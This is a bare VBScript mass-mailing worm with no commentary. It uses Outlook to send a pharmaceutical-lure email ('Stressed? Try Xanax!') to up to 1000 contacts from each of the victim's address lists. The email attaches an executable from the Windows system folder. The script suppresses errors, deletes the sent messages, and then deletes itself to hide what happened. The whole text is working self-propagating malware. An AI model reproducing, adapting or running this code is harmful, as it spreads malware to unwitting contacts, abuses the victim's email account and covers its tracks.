On Error Resume Next
Dim xanax, Mail, Counter, A, B, C, D, E, F
Set xanax = CreateObject("outlook.application")
Set Mail = xanax.GetNameSpace("MAPI")
For A = 1 To Mail.AddressLists.Count
Set B = Mail.AddressLists(A)
Counter = 1
Set C = xanax.CreateItem(0)
For D = 1 To B.AddressEntries.Count
E = B.AddressEntries(Counter)
C.Recipients.Add E
Counter = Counter + 1
If Counter > 1000 Then Exit For
Next
C.Subject = "Stressed? Try Xanax!"
C.Body = "Hi there! Are you so stressed that it makes you ill? You're not alone! Many people suffer from stress, these days. Maybe you find Prozac too strong? Then you NEED to try Xanax, it's milder. Still not convinced? Check out the medical details in the attached file. Xanax might change your life!"
C.Attachments.Add "C:\WINDOWS\system\xanax.exe"
C.DeleteAfterSubmit = True
C.Send
E = ""
Next
Set F = CreateObject("Scripting.FileSystemObject")
F.DeleteFile Wscript.ScriptFullName
